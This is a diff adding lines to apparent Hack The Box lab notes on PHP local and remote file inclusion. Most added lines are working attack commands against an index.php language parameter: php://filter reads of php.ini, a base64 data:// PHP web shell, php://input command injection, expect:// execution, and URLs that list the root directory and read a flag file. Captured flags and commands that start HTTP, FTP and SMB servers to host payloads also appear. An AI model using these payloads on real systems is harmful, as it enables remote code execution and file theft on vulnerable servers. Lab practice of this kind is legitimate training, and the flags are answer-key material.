@@ -23,5 +23,28 @@ echo "hash" | base64 -d #decrypt
 HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}
 
 php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+
 
 echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+
+http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+
+curl -s -X POST --data '<?php system($_GET["c-m-d"]); ?>' "http://94.237.62.195:45255/index.php?language=php://input&cmd=id" | grep uid
+
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+
+http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls /
+http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
+
+HTB{d!$46l3_r3m0t3_url_!nclud3}
+
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_includ
+
+echo "<php? system($_GET['']); ?>"
+
+sudo python3 -m http.server <LISTENING_PORT>
+sudo python -m pyftpdlib -p 21
+impacket-smbserver -smb2support share $(pwd)
